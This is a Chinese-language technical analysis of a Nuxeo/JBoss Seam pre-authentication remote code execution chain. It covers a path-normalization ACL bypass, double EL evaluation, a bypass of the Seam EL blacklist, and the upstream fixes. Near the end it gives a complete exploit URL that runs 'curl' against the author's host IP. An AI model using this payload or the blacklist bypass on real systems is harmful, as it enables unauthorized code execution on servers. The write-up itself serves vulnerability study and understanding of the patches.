@@ -1,0 +1,90 @@
+这也是我们之前访问`http://172.17.0.2:8080/nuxeo/login.jsp;/..;/oauth2Grant.jsp`出现了`500
+java.lang.NullPointerException`的原因。
+#### 代码重用功能导致部分EL调用
+由于`Nuxeo`与`Tomcat`对于路径解析不一致的问题，目前我就可以访问任意的`servlet`。现在的问题是我们需要访问一个去访问未经认证的Seam
+servlet去触发漏洞。如Orange所说:
+> actionMethod是一个特殊的参数，可以从查询字符串中调用特定的JBoss EL（Expression Language）
+`actionMethod`的触发是由`org.jboss.seam.navigation.Pages::callAction`处理。如下：
+    private static boolean callAction(FacesContext facesContext)
+    {
+        //TODO: refactor with Pages.instance().callAction()!!
+        boolean result = false;
+        String actionId = facesContext.getExternalContext().getRequestParameterMap().get("actionMethod");
+        if (actionId!=null)
+        {
+        String decodedActionId = URLDecoder.decode(actionId);
+        if (decodedActionId != null && (decodedActionId.indexOf('#') >= 0 || decodedActionId.indexOf('{') >= 0) ){
+            throw new IllegalArgumentException("EL expressions are not allowed in actionMethod parameter");
+        }
+        if ( !SafeActions.instance().isActionSafe(actionId) ) return result;
+        String expression = SafeActions.toAction(actionId);
+        result = true;
+        MethodExpression actionExpression = Expressions.instance().createMethodExpression(expression);
+        outcome = toString( actionExpression.invoke() );
+        fromAction = expression;
+        handleOutcome(facesContext, outcome, fromAction);
+        }
+        return result;
+    }
+其中`actionId`就是`actionMethod`参数的内容。`callAction`整体功能很简单，从`actionId`中检测出来`expression`(即EL表达式)，之后利用`actionExpression.invoke()`执行表达式，最终通过`handleOutcome()`输出表达式的结果，问题是在于`handleOutcome()`也能够执行EL表达式。但是`actionMethod`也不可能让你随意地执行EL表达式，在方法中还存在一些安全检查。包括`SafeActions.instance().isActionSafe(actionId)`。跟踪进入到`org.jboss.seam.navigation.SafeActions::isActionSafe()`:
+    public boolean isActionSafe(String id)
+       {
+          if ( safeActions.contains(id) ) return true;
+          int loc = id.indexOf(':');
+          if (loc`表达式。以上的分析就说明了为什么需要满足orange的三个条件了。
+    1.actionMethod的值必须是一对，例如：FILENAME:EL_CODE
+    2.FILENAME部分必须是context-root下的真实文件
+    3.文件FILENAME必须包含内容“＃{EL_CODE}”（双引号是必需的）
+例如这样的URL：`http://172.17.0.2:8080/nuxeo/login.jsp;/..;/create_file.xhtml?actionMethod=login.xhtml:userDTO.username`。其中`login.xhtml:userDTO.username`满足了第一个要求；`login.xhtml`是真实存在的，满足了第二个要求；`"#{userDTO.username}"`满足了第三个要求。
+#### 双重评估导致EL注入
+看起来是非常安全的。因为这样就限制了只能执行在页面中的EL表达式，无法执行攻击者自定义的表达式，而页面中的EL表达式一般都是由开发者开发不会存在诸如RCE的这种漏洞。但是这一切都是基于理想的情况下。但是之前分析就说过在`callAction()`中最终还会调用`handleOutcome(facesContext,
+outcome,
+fromAction)`对EL执行的结果进行应一步地处理，如果EL的执行结果是一个表达式则`handleOutcome()`会继续执行这个表达式，即双重的EL表达式会导致EL注入。
+我们对`handleOutcome()`的函数执行流程进行分析：
+  1. 在`org.jboss.seam.navigation.Pages::callAction()`中执行`handleOutcome()`:
+  2. `org.jboss.seam.navigation.Pages:handleOutcome()`中。
+  3. `org.nuxeo.ecm.platform.ui.web.rest.FancyNavigationHandler::handleNavigation()`
+  4. `org.jboss.seam.jsf.SeamNavigationHandler::handleNavigation()`
+  5. `org.jboss.seam.core.Interpolator::interpolate()`
+  6. `org.jboss.seam.core.Interpolator::interpolateExpressions()`中，以`Object value = Expressions.instance().createValueExpression(expression).getValue();`的方式执行了EL表达式。
+问题的关键是在于找到一个xhtml供我们能够执行双重EL。根据orange的文章，找到`widgets/suggest_add_new_directory_entry_iframe.xhtml`。如下：
+    ....
+其中存在`#{request.getParameter('directoryNameForPopup')}`一个EL表达式，用于获取到`directoryNameForPopup`参数的内容(这个就是第一次的EL表达式了)。那么如果`directoryNameForPopup`的参数也是EL表达式，这样就会达到双重EL表达式的注入效果了。
+至此整个漏洞的攻击链已经完成了。
+#### 双重EL评估导致RCE
+需要注意的是在`Seam2.3.1`中存在一个反序列化的黑名单，具体位于`org/jboss/seam/blacklist.properties`中，内容如下：
+    .getClass(
+    .class.
+    .addRole(
+    .getPassword(
+    .removeRole(
+    session['class']
+黑名单导致无法通过`"".getClass().forName("java.lang.Runtime")`的方式获得反序列化的对象。但是可以利用数组的方式绕过这个黑名单的检测，`""["class"].forName("java.lang.Runtime")`。绕过了这个黑名单检测之后，那么我们就可以利用`""["class"].forName("java.lang.Runtime")`这种方式范反序列化得到`java.lang.Runtime`类进而执行RCE了。我们重新梳理一下整个漏洞的供给链：
+  1. 利用`nuxeo`中的`bypassAuth`的路径规范化绕过`NuxeoAuthenticationFilter`的权限校验；
+  2. 利用`Tomcat`对路径的处理，访问任意的`servlet`;
+  3. 利用`jboss-seam`中的`actionMethod`使我们可以调用`actionMethod`。利用`actionMethod`利用调用任意xhtml文件中的EL表达式;
+  4. 利用`actionMethod`我们利用调用`widgets/suggest_add_new_directory_entry_iframe.xhtml`，并且可以控制其中的参数;
+  5. 控制`suggest_add_new_directory_entry_iframe`中的`request.getParameter('directoryNameForPopup')`中的`directoryNameForPopup`参数，为RCE的EL表达式的payload;
+  6. `org.jboss.seam.navigation.Pages::callAction`执行双重EL,最终造成RCE;
+我们最终的Payload是：
+    http://172.17.0.2:8080/nuxeo/login.jsp;/..;/create_file.xhtml?actionMethod=widgets/suggest_add_new_directory_entry_iframe.xhtml:request.getParameter('directoryNameForPopup')&directoryNameForPopup=/?key=#{''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'curl 172.17.0.1:9898')}
+其中`172.17.0.1`是我宿主机的IP地址，`''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15]`得到的就是`exec(java.lang.String)`，`''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15]`得到的就是`getRuntime()`,最终成功地RCE了。
+### 修复
+#### Nxueo的修复
+`Nuxeo`出现的漏洞的原因是在于`ACL`的绕过以及与tomcat的路径规范化的操作不一致的问题。这个问题已经在[NXP-24645: fix
+detection of request page for
+login](https://github.com/nuxeo/nuxeo/commit/8097adebf75212115f636e08f381f713da0f39d5)中修复了。修复方式是：  
+现在通过`httpRequest.getServletPath();`获取的路径和`tomcat`保持一致，这样ACL就无法被绕过同时有也不会出现于tomcat路径规范化不一致的问题；
+#### seam的修复
+Seam的修复有两处,[NXP-24606: improve Seam EL
+blacklist](https://github.com/nuxeo/jboss-seam/commit/42cb5ee577b3fb5182751cd7beffa3e0eeeb46dc#diff-b79673630342d56e1503a01bd6ff9a92)和[NXP-24604:
+don't evalue EL from user input](https://github.com/nuxeo/jboss-seam/commit/f263738af8eac44cda7a41ea088c99e69a4edb48)  
+在`blacklist`中增加了黑名单：
+包括`.forName(`，这样无法通过`.forName(`进行反序列化了。
+修改了`callAction()`中的方法处理，如下：
+修改之后的`callAction()`没有进行任何的处理直接返回`false`不执行任何的EL表达式。
+### 总结
+通篇写下来发现自己写和Orange的那篇文章并没有很大的差别，但是通过自己手动地调试一番还是有非常大的收获的。这个漏洞的供给链的构造确实非常的精巧。
+  1. 充分利用了`Nuxeo`的ACL的绕过，与`Tomcat`对URL规范化的差异性导致了我们的任意的`servlet`的访问。
+  2. 利用了`seam`中的`actionMethod`使得我们可以指向任意`xhtml`中的任意EL表达式。
+  3. 利用了`callAction()`中对于EL表达式的处理执行了双重EL表达式。
